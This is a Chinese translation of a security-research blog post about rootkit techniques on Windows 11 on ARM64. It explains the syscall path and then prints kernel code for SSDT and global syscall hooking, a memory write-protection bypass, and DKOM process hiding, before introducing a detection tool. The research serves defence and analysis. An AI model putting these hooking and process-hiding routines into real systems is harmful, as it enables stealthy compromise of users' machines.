原文链接：<https://www.cyberark.com/resources/threat-research-blog/fantastic-rootkits-and-where-to-find-them-part-3-arm-edition>

**介绍**  
在本博客中，我们将讨论非传统架构Windows 11 on ARM64上的创新Rootkit技术。

在之前的帖子中，我们涵盖了应用于现代Windows
10操作系统的Rootkit技术（[第1部分](https://www.cyberark.com/resources/all-blog-posts/fantastic-rootkits-and-where-to-find-them-part-1 "第1部分")）以及用于Intel
x86-64的当前威胁的Rootkit分析（[第2部分](https://www.cyberark.com/resources/all-blog-posts/fantastic-rootkits-and-where-to-find-them-part-1 "第2部分")）。

尽管我们尚未遇到任何针对此平台的恶意软件系列，但随着Windows on ARM设备的普及，我们可能会在不久的将来看到它。

在这项研究中，我们想通过将之前在第1部分中讨论的一些Rootkit技术应用于ARM64架构和该架构上Windows平台的内部机制，提前了解潜在对手。

Windows 11 on ARM64是Windows 10 Mobile / RT / CE的继任者，最初设计用于运行在ARM架构上的智能手机和平板电脑。

Windows on
ARM（WoA）为智能手机和笔记本电脑等移动设备提供了更好的电池续航时间和出色的性能。运行此架构/平台的设备的一些示例是Microsoft Surface
Pro X，Lenovo Thinkpad X13s和Apple Mx（M1 / M2等）设备，这些设备也可以运行Windows on ARM。

ARM处理器基于RISC（精简指令集计算机）架构，这意味着所有指令的字节长度都相同。与CISC（复合指令集计算机）架构（例如英特尔的处理器）相反，每个操作码的字节长度在不同指令之间有所不同。

值得一提的是，WoA平台还模拟了为了向后兼容而针对Intel x86-x64架构编译的用户态应用程序。

最后，在进行这项研究时，我们还编写了一个工具来检测WoA Rootkits。

**Windows on ARM64内幕入门**  
如前所述，虽然在ARM上运行的Windows不是新事物，但Windows 11专门针对ARM64进行了编译，这意味着有更多的通用寄存器和支持64位寻址。

与其Intel x64版本一样，Windows
11的ARM64（AARCH64）版本共享许多相同的内核结构。例如，KUSER_SHARED_DATA位于地址0xfffff78000000000处的内存中。

    
    
    0：kd> dt 0xfffff78000000000 nt！_KUSER_SHARED_DATA
    
    0x000 TickCountLowDeprecated：0
    0x004 TickCountMultiplier：0xfa00000
    0x008 InterruptTime：_KSYSTEM_TIME
    0x014 SystemTime：_KSYSTEM_TIME
    0x020 TimeZoneBias：_KSYSTEM_TIME
    0x02c ImageNumberLow：0xaa64
    0x02e ImageNumberHigh：0xaa64
    0x030 NtSystemRoot：[260]“C：\ Windows” …已省略…
    0x3c6 QpcData：3
    0x3c6 QpcBypassEnabled：0x3''
    0x3c7 QpcShift：0''
    0x3c8 TimeZoneBiasEffectiveStart：_LARGE_INTEGER 0x01d9a953`1e6f6764
    0x3d0 TimeZoneBiasEffectiveEnd：_LARGE_INTEGER 0x01da0fc6`74e5a800
    0x3d8 XState：_XSTATE_CONFIGURATION
    0x720 FeatureConfigurationChangeStamp：_KSYSTEM_TIME
    0x72c Spare：0
    0x730 UserPointerAuthMask：0xffff8000`00000000

**代码片段1：ARM64架构下KUSER_SHARED_DATA的数据结构**  
此外，就像Intel体系结构中TEB存储在fs/gs段寄存器中的地址0x0处一样（通常引用为gs:[0x0]），在ARM64中，用户态下指向TEB结构的指针存储在x18平台寄存器中，在内核态下，相同寄存器将保存指向KPCR的指针。

**ARM64执行模式**  
异常级别类似于Intel中基于ring的CPL（当前特权级别），其中ring3是用户态，ring0是内核态。  
ARM处理器定义了四个不同的“异常级别”EL0-EL3：

  * EL_0->用户态（Intel x86-64中的ring3）
  * EL_1->内核态（Intel x86-64中的ring0）
  * EL_2->虚拟化程序（非官方ring-1，适用于Intel x86-64）
  * EL_3->监视器（非官方ring-2，适用于Intel x86-64）  
用于在执行模式之间切换的指令：

  * SVC指令（Intel x86-64中的SYSCALL）

  * HVC指令（Intel x86-64中的VMX VMCALL）
  * SMC指令（从EL_2切换到EL_3）  
**用户态（EL0）到内核态（EL1）转换**  
当用户态（EL0）应用程序调用系统服务的函数（或任何其他需要内核参与的函数）时，它通常会调用Kernel32.dll函数，例如ReadFile，该函数将调用NtDll.dll中的NtReadFile。

这个过程与x86-64中相同，在ARM64中，但是NtReadFile到内核态（EL1）的转换不同（图1）。

![](./img/3645700074023333617.png)

DLL堆栈

**图1：在图表中，我们可以看到API调用如何通过DLL堆栈传输，直到发生用户态到内核态转换**

首先，在ARM64中，我们使用一个特殊指令（就像Intel x86-64中的SYSCALL /
SYSENTER一样）称为SVC来从用户态转换到内核态（图2）。

![](./img/1552047434192252484.png)

**图2：在图中，我们可以看到NtDll.NtCreateFile的反汇编是使用SVC指令和系统调用号实现的。**

执行SVC指令后，系统使用一个特殊的控制寄存器VBAR_EL1，它指向KiArm64ExceptionVectors，这是一个指向函数数组/列表的符号，其中每个元素大小为0x80字节。

每个元素都包含一个函数的实现（操作码），对于小于0x80的函数，使用0x00作为分隔符/填充符。

KiArm64ExceptionVectors数组（图3）包含许多函数，但最重要的是，它保存了位于偏移0x200和0x400处的KiKernelExceptionHandler和KiUserExceptionHandler函数。

![](./img/6599014480995967935.png)

**图3：VBAR_EL1控制寄存器指向KiArm64ExceptionVectors，在偏移0x200处驻留KiKernelExceptionHandler，在偏移0x400处驻留KiUserExceptionHandler**

这两个函数负责最终调用KiSystemService/KiSystemServiceHandler函数，后者调用适当的系统调用处理程序。

从用户态到内核态的整个转换过程如下图所示（图4）。

![](./img/2099432082359208579.png)

**图4：在图中，从用户态到内核态的整个转换过程**

在启动过程中调用以下函数时，VBAR_EL1控制寄存器将被初始化：

调用堆栈：

    
    
    00 KiSystemStartup+0x12c
    01 KiInitializeBootStructures+0x174
    02 KiInitializeExceptionVectorTable

**代码片段2：KiInitializeExceptionVectorTable的调用堆栈**

KiInitializeExceptionVectorTable的反汇编显示了VBAR_EL1控制寄存器（图5）使用KiArm64ExceptionVectors进行初始化。

VBAR_EL1控制寄存器

![](./img/7723683535819495310.png)

**图5：在KiInitializeExecptionVectorTable中使用KiArm64ExceptionVectors初始化VBAR_EL1控制寄存器**

**ARM64 Rootkit技术实践**  
现在我们了解了Windows on ARM64的内部机制的基础和差异，我们可以将我们的Rootkit技术移植到这个平台上。

****免责声明1** ：

我们在启用调试模式下进行了此研究，这意味着PatchGuard和驱动程序签名验证被关闭。此外，安全启动也被关闭。

我们没有尝试绕过这些缓解措施。

注意，PatchGuard通常只会在修改内核后的15-30分钟内触发蓝屏错误，这可能足以让攻击者在触发蓝屏错误之前恢复更改。

最后，使用这些Rootkit方法可能会使系统不稳定并且容易崩溃。

**System Service Dispatch Table**  
Windows内核包含一个未导出的符号KiServiceTable，它指向系统服务描述符/分派表（SSDT）。SSDT也可以从另外两个未导出的符号KeServiceDescriptorTable和KeServiceDescriptorTableShadow中解析出来，基本上是通过解引用它们中的第一个QWORD来获取指向我们表的指针。

    
    
    typedef struct SystemServiceTable {
    UINT32* ServiceTable;
    UINT32* CounterTable;
    UINT32 ServiceLimit;
    UINT32* ArgumentTable;
    } SSDT_Entry;

**代码片段3：SSDT_Entry数据结构**

与Windows x86版本不同，ARM
SSDT不直接包含每个系统调用的处理程序函数指针。但它确实包含一个DWORD大小的“CompactOffset”，可以使用以下公式将其转换为完整的64位指向系统调用处理程序的指针（DecodedTargetEntry）：

    
    
    <DecodedTargetEntry> = nt！KiServiceTable +（<CompactOffset> >>> 4）

**代码片段4：将CompactOffset解码为系统调用处理程序函数的公式**

例如，如果我们想要syscall＃0x47的系统调用处理程序函数，则可以在WinDbg中使用先前显示的公式来获取它。首先，我们将使用以下WinDbg表达式获取CompactOffset。

    
    
    ? dwo(nt！KiServiceTable + <SysCallNum> * 4)

**代码片段5：解析特定syscall索引的CompactOffset的WinDbg命令**

然后，我们可以把我们获得的值或整个公式应用到以下WinDbg表达式中以获取系统调用处理程序函数。

    
    
    0: kd> u nt!KiServiceTable + (dwo(nt!KiServiceTable + 0x47 * 4) >>> 4)
    nt!NtAddAtom:
    fffff801`67159cf0 52800003 mov         w3,#0
    fffff801`67159cf4 17f78a2b b           nt!NtAddAtomEx (fffff801`66f3c5a0)
    fffff801`67159cf8 d503201f nop
    fffff801`67159cfc 00000000 ???

**代码片段6：解析特定syscall索引的syscall处理程序函数的WinDbg命令**

在我们继续讨论挂钩SSDT的技术细节之前，我们必须谈论一下trampoline以及它们在ARM64中如何实现，因为trampoline是挂钩机制的重要组成部分，并且这影响了我们的实现并提出了一些新的限制。

**关于ARM64 trampoline**  
trampoline是一段代码，将无条件地执行分支到指定地址。

与可以使用（FAR/absolute）JMP指令的Intel体系结构不同，ARM没有类似于可以采用绝对64位地址的指令，因此要创建我们的trampoline，我们使用以下三条指令ADRP、ADD和BR组合：

    
    
    adrp <reg>，＃0x<Absolute Address & 0xfffffffffffff000>
    add <reg>，<reg>，＃0x<Absolute Address & 0x0fff>
    br <reg>

**代码片段7：ARM64中的通用trampoline**

看看这段代码做了什么：

使用ADRP指令与页面对齐地址计算相对于当前PC（程序计数器）的地址，并将结果分配给一个寄存器。  
ADD将同一寄存器分配为寄存器值和绝对地址的低12位结果，以获取页面中正确的偏移量。  
BR（分支寄存器）无条件地分支或跳转到存储在操作数寄存器中的地址。  
实际trampoline示例如下：

    
    
    adrp       xip0,BOOTVID！VidSolidColorFill+0x80 (fffff801`6bd93000)
    add        xip0,xip0,#0x214
    br         xip0

**代码片段8：ARM64中用于跳转的trampoline（无条件分支）执行到0xfffff8016bd93214**

**回到SSDT Hooking**  
使用此技术非常简单。使用先前讨论的公式，我们使用一个新值覆盖特定syscall索引的CompactOffset，该值将解码为不同的地址。

要从64位绝对地址创建CompactOffset，我们必须 逆向公式：

    
    
    <CompactOffset> =（UINT32）（16 *（<DecodedTargetEntry>  - g_KiServiceTable））

**代码片段9：将绝对地址转换为CompactOffset的逆向公式**

通过使用新计算的CompactOffset，我们可以替换SSDT中的CompactOffset dword值，以转移syscall的执行。

一旦完成，我们只需要确保新的DecodedEntryTarget（解码的64位地址）将指向一些可以无误执行（否则机器将崩溃）并最终将跳回（使用trampoline）到原始处理程序函数（以执行syscall的实际工作）的代码。

**全局SYSCALL Hook**  
全局syscall hook是一种单个补丁，可钩住所有syscall，类似于MSR
hooking（使用英特尔处理器）。我们通过以下方式对KiSystemService进行了钩住所有syscalls的修补（图6）：

  * 将原始函数的前12个字节复制到我们的Hook Code Cave中
  * 用trampoline覆盖原始函数的前12个字节（3个指令）以跳转到我们的hook Code Cave
  * 在复制的字节后将其余hook代码复制到我们的Code Cave中
  * 使用trampoline结束hook函数，以返回到原始函数的第4个指令（被hook的函数）

![](./img/9082725080822255388.png)

**图6：原始函数与Hooked函数和带有trampoline的Hook**

**VBAR Hooking**  
值得一提的是，在此hooking技术中，我们将通过覆盖新值来修补VBAR_EL1控制寄存器，该值将指向包含我们实现的KiUserExceptionHandler和KiKernelExceptionHandler函数的修改后的KiArm64ExceptionVectors。

不幸的是，虽然理论上这应该有效，但我们无法使用此方法。

**其他挑战**  
理论上，SSDT Hooking和Global SYSCALL Hook技术应该无缝运行，但在现实生活中，事情并不那么简单，因此让我们更深入地了解原因。

**1.查找Code Cave**  
我们将讨论的第一个障碍是如何查找或创建一些内存空间以供我们进行hook操作。

我们需要一个内存区域，它可以包含可写和可执行指令，并且我们可能还有更多考虑因素或约束条件。

从现在开始，我们将使用术语“Code Cave”来描述这样的内存区域。

当替换SSDT条目时，我们面临的一个限制是使用来创建我们的CompactOffset的地址应该在KiServiceTable地址之后且靠近它，否则CompactOffset将无法正确解析到我们的地址。

为了克服这个挑战，我们使用一个函数在内核中搜索所有已加载的模块/驱动程序，以查找以两个NOP指令开头并后跟任意多个零的模式。

注意，两个NOP指令在ARM64中为8个字节（单个NOP为0xd503201f）。

然后，一旦找到候选Code
Cave地址，我们通过首先使用逆向公式将其转换为CompactOffset，然后使用常规公式来查看是否返回相同的地址来验证它是否可以用作CompactOffset。

    
    
    UINT32 CalculateServiceTableEntry(ULONGLONG codeCave)
    {
        return (UINT32)(16 * (codeCave - g_KiServiceTable));
    }
    ULONGLONG SearchCodeCave(ULONGLONG pStartSearchAddress, ULONGLONG value, ULONGLONG size)
    {
        UINT64 pEndSearchAddress = pStartSearchAddress + size;
    
        while (pStartSearchAddress++ && pStartSearchAddress < pEndSearchAddress-8) { if (MmIsAddressValid((PVOID)pStartSearchAddress) && MmIsAddressValid((PVOID)(pStartSearchAddress + 0x8)) && MmIsAddressValid((PVOID)(pStartSearchAddress + 0x10)) && MmIsAddressValid((PVOID)(pStartSearchAddress + 0x18)) ) { if (*(PUINT64)(pStartSearchAddress) == value && // in our case value = 0xd503201fd503201f => 2 nops
                        *(PUINT64)(pStartSearchAddress + 0x8 ) == 0x0 &&
                        *(PUINT64)(pStartSearchAddress + 0x10) == 0x0
                        )
                    {
                        DbgPrint("[*] Checking Code Cave at: 0x%llx\r\n", (PVOID)(pStartSearchAddress));
                        if (pStartSearchAddress == (g_KiServiceTable + (CalculateServiceTableEntry(pStartSearchAddress) >> 4)))
                        {
                            DbgPrint("[*] Code Cave Found At: 0x%llx\r\n", (PVOID)(pStartSearchAddress));
                            //__debugbreak();
                            return pStartSearchAddress;
                        }
                        else
                        {
                            DbgPrint("[!] Code Cave is not reversible from SSDT...\r\n");
                        }
                    }
                }
            }
        }
        DbgPrint("[!] Code Cave Not Found!\r\n", (PVOID)(pStartSearchAddress));
        return 0;
    }
    

**代码片段10：SearchCodeCave片段，作者用于搜索所有内核模块以查找以两个NOP开头后跟零的Code Cave的函数**

**2.禁用内核写保护**  
像SSDT这样的内核结构不会改变。因此它们驻留在READ_ONLY内存中。第二个障碍是在READ_ONLY内存上写入。例如，当我们用自己的内容替换SSDT中的CompactOffset时，该内存空间被标记为READ_ONLY，并且我们会收到异常。在x86中，我们使用了一个技巧来通过翻转CR0中的位来禁用写保护。不幸的是，在尝试为ARM64找到类似技巧时，我们无法找到要翻转哪个寄存器和位，尽管我们尝试了很多次都没有成功。

    
    
    void DisableWP()
    {
    ULONG_PTR cr0 = __readcr0();
    cr0 &= 0xfffeffff;
    __writecr0(cr0);
    }
    

**代码片段11：Intel处理器的CR0位翻转函数**

但是，在一段时间之后，我们能够检索出一种方法来克服这个挑战，方法是稍微修改以下函数（部分从这里复制）：<https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/ssdt-hook#disable-write-protection>

    
    
    NTSTATUS SuperCopyMemory(IN VOID UNALIGNED* Destination, IN CONST VOID UNALIGNED* Source, IN ULONG Length)
    {
        //Change memory properties.
        PMDL g_pmdl = IoAllocateMdl(Destination, Length, 0, 0, NULL);
        if (!g_pmdl)
            return STATUS_UNSUCCESSFUL;
        MmBuildMdlForNonPagedPool(g_pmdl);
        //unsigned int* Mapped = (unsigned int*)MmMapLockedPages(g_pmdl, KernelMode);
        UINT64* Mapped = (UINT64*)MmMapLockedPagesSpecifyCache(g_pmdl, KernelMode, MmWriteCombined, NULL, FALSE, NormalPagePriority); 
        if (!Mapped)
        {
            IoFreeMdl(g_pmdl);
            return STATUS_UNSUCCESSFUL;
        }
    
        KIRQL kirql = KeRaiseIrqlToDpcLevel();
        DbgPrint("0x%llx <- 0x%llx (%d)\r\n", Destination, Source, Length); RtlCopyMemory(Mapped, &Source, Length); if (KeGetCurrentIrql() >= DISPATCH_LEVEL)
            KeLowerIrql(kirql);
        //Restore memory properties.
        MmUnmapLockedPages((PVOID)Mapped, g_pmdl);
        IoFreeMdl(g_pmdl);
        return STATUS_SUCCESS;
    }
    

**代码片段12：SuperCopyMemory函数片段**

该函数创建一个新的MDL（Memory Descriptor List），并对我们要覆盖的相同地址具有WRITE权限。

**直接内核对象操作（DKOM）**  
直接内核对象操作（DKOM）是我们在[第1部分](https://www.cyberark.com/resources/threat-research-blog/fantastic-rootkits-and-where-to-find-them-part-1
"第1部分")中讨论的一种技术，但我们想谈谈将其移植到我们的新平台的过程。

以下代码与我们在先前博客文章中用于在任务管理器中隐藏进程的代码非常相似；区别仅在于全局变量ActiveOffsetPre和ActiveOffsetNext，它们是EPROCESS结构中的常量偏移量。

    
    
    ULONG_PTR ActiveOffsetPre = 0x400;
    ULONG_PTR ActiveOffsetNext = 0x408;
    VOID HideProcess(char* ProcessName)
    {
        PEPROCESS CurrentProcess = NULL;
        char* currImageFileName = NULL;
        if (!ProcessName)
            return;
        CurrentProcess = PsGetCurrentProcess();    //System  EProcess
        // Get the ActiveProcessLinks address
        PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + ActiveOffsetPre);
        PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
        PLIST_ENTRY NextListEntry = NULL;
        while (CurrListEntry != PrevListEntry)
        {
            NextListEntry = CurrListEntry->Flink;
            currImageFileName = (char*)(((ULONG_PTR)CurrListEntry - ActiveOffsetPre) + ImageName);
            DbgPrint("Iterating %s\r\n", currImageFileName);
            if (strcmp(currImageFileName, ProcessName) == 0)
            {
                DbgPrint("[*] Found Process! Needs To Be Removed %s\r\n", currImageFileName);
                if (MmIsAddressValid(CurrListEntry))
                {
                    RemoveEntryList(CurrListEntry);
                }
                break;
            }
            CurrListEntry = NextListEntry;
        }
    }
    

**代码片段13：HideProcess函数片段（DKOM）**

这种区别是由于Windows架构版本之间（甚至在同一体系结构的不同Windows版本之间）的EPROCESS结构不同造成的。

让我们看看对此结构所做的相关更改。

    
    
    0: kd> dt nt!_LIST_ENTRY
    +0x000 Flink            : Ptr64 _LIST_ENTRY
    +0x008 Blink            : Ptr64 _LIST_ENTRY
    0: kd> dt nt!_EPROCESS
    +0x000 Pcb              : _KPROCESS
    +0x3f0 ProcessLock      : _EX_PUSH_LOCK
    +0x3f8 UniqueProcessId  : Ptr64 Void
    +0x400 ActiveProcessLinks : _LIST_ENTRY
    +0x410 RundownProtect   : _EX_RUNDOWN_REF
    +0x418 Flags2           : Uint4B
    +0x418 JobNotReallyActive : Pos 0, 1 Bit
    +0x418 AccountingFolded : Pos 1, 1 Bit
    +0x418 NewProcessReported : Pos 2, 1 Bit
    +0x418 ExitProcessReported : Pos 3, 1 Bit
    ... redacted ...
    +0x500 OwnerProcessId   : Uint8B
    +0x508 Peb              : Ptr64 _PEB
    +0x510 Session          : Ptr64 _MM_SESSION_SPACE
    +0x518 Spare1           : Ptr64 Void
    +0x520 QuotaBlock       : Ptr64 _EPROCESS_QUOTA_BLOCK
    +0x528 ObjectTable      : Ptr64 _HANDLE_TABLE
    +0x530 DebugPort        : Ptr64 Void
    +0x538 WoW64Process     : Ptr64 _EWOW64PROCESS
    +0x540 DeviceMap        : _EX_FAST_REF
    +0x548 EtwDataSource    : Ptr64 Void
    +0x550 PageDirectoryPte : Uint8B
    +0x558 ImageFilePointer : Ptr64 _FILE_OBJECT
    +0x560 ImageFileName    : [15] UChar
    +0x56f PriorityClass    : UChar
    +0x570 SecurityPort     : Ptr64 Void

**代码片段14：ARM64中_EPROCESS和_LIST_ENTRY的数据结构**

我们注意到ActiveProcessLinks位于EPROCESS结构的偏移量为0x400处，其类型为LIST_ENTRY。此外，ImageFileName位于偏移量为0x560处。

根据EPROCESS和LIST_ENTRY结构，Flink字段位于偏移量为0x400+0x00的位置，即等于0x400。Blink字段位于0x400+0x8的位置，即等于0x408。

我们在代码开头定义这些偏移量：

    
    
    ULONG_PTR ActiveOffsetPre = 0x400;
    ULONG_PTR ActiveOffsetNext = 0x408;
    ULONG_PTR ImageName = 0x560;
    

**代码片段15：全局变量ActiveOffsetPre和ActiveOffsetNext的代码片段**

**Windows On ARM Rootkit Detector（WOARKD）**  
**免责声明2：此工具仍处于开发阶段。

[Windows On ARM Rootkit
Detector（WOARKD）](https://www.github.com/cyberark/woarkd/ "Windows On ARM
Rootkit Detector（WOARKD）")工具的目的与我们过去针对Intel
x86-x64架构看到的工具相同，如[GMER](http://www.gmer.net/ "GMER")、Rootkit
Unhooker和IceSword。

它通过检查是否对其函数应用了任何hook技术来实时检查系统是否感染。

由于ARM64在其机制上不同，正如我们在本文中所解释的那样，旧工具中没有一个能在其平台上工作，这就是创建此工具的原因。

该工具由两个组件组成：

  * 允许读取和写入内核值的驱动程序显然不安全，并且可能在系统上具有危害性或可利用性，但此工具仅用于取证。不应在生产环境中使用它。还要记住，驱动程序未签名，因此必须打开测试签名才能使用该工具。
  * 一个.NET GUI，操作驱动程序并告诉我们是否发现感染。  
GUI处理驱动程序安装并启动其操作，然后可以扫描所有SYSCALL和不同地址，以检查是否对内核结构进行了任何篡改。

**结论**  
尽管我们没有找到任何针对此平台的在野rootkit，但这场军备竞赛已经开始。我们想通过创建WOARKD并将其作为免费工具发布给公众来领先一步，该工具可以扫描SYSCALL并告诉其用户是否使用先前提到的技术篡改了其系统。

随着Windows on
ARM系统在市场上变得越来越普遍，我们可能会看到对该平台的威胁。IR和恶意软件分析专家应该为这些威胁做好准备，因为他们可能需要具备新的技能集，并面临分析和逆向这些威胁的新挑战。

正如先前的帖子中所提到的，操作系统和处理器的防御和缓解措施，例如：

  * KPP（aka PatchGuard）
  * DSE（Driver Signing Enforcement）
  * Secure Boot
  * HVCI（Hypervisor based Code Integrity）
  * Vulnerable Driver Blocklist  
这些缓解措施对成功规避对任何Windows平台（包括ARM64）的攻击至关重要。我们强烈建议使用这些选项配置endpoints(终端点)和生产服务器（有些是必需的，不能轻易关闭）。

我们希望这项研究能让我们明白ARM64恶意软件和rootkit特别是其中涉及的内部机制。

**引用**

  * <https://gracefulbits.wordpress.com/2018/07/26/system-call-dispatching-for-windows-on-arm64/>
  * <https://codemachine.com/articles/arm_assembler_primer.html>
  * <https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.01.pdf>
  * <https://developer.arm.com/documentation/ddi0406/b/System-Level-Architecture/Virtual-Memory-System-Architecture–VMSA-/CP15-registers-for-a-VMSA-implementation/c12–Vector-Base-Address-Register–VBAR->
  * <https://developer.arm.com/documentation/ddi0601/2020-12/AArch32-Registers/VBAR–Vector-Base-Address-Register>
  * <https://j00ru.vexillium.org/syscalls/nt/64/>
  * <https://eastrivervillage.com/Anatomy-of-Linux-system-call-in-ARM64/>
  * <https://0xax.gitbooks.io/linux-insides/content/Booting/linux-bootstrap-1.html>
  * <https://elixir.bootlin.com/linux/latest/source/arch/arm64/kernel/sys32.c#L130>
  * <https://developer.arm.com/documentation/dui0471/m/handling-processor-exceptions/supervisor-calls>
  * <http://standa-note.blogspot.com/2015/01/a-lst-of-patchguard-v81-related.html>
  * <https://learn.microsoft.com/en-us/cpp/intrinsics/arm64-intrinsics?view=msvc-170>
  * <https://learn.microsoft.com/en-us/cpp/build/arm64-windows-abi-conventions?view=msvc-170>
  * <https://www.comae.com/posts/smbaloo-building-a-rce-exploit-for-windows-arm64-smbghost-edition/>
  * <https://vuls.cert.org/confluence/pages/viewpage.action?pageId=90210306>
  * <https://vuls.cert.org/confluence/pages/viewpage.action?pageId=90210320>
  * <https://github.com/Wack0/CVE-2022-21894> – Secure Boot Bypass (Intel)
  * <https://modexp.wordpress.com/2018/10/30/arm64-assembly/>
  * <https://www.exploit-db.com/exploits/48073>
  * <https://devblogs.microsoft.com/oldnewthing/20220726-00/?p=106898#:~:text=The> 64-bit version of,including Windows)%20call%20it%20arm64.

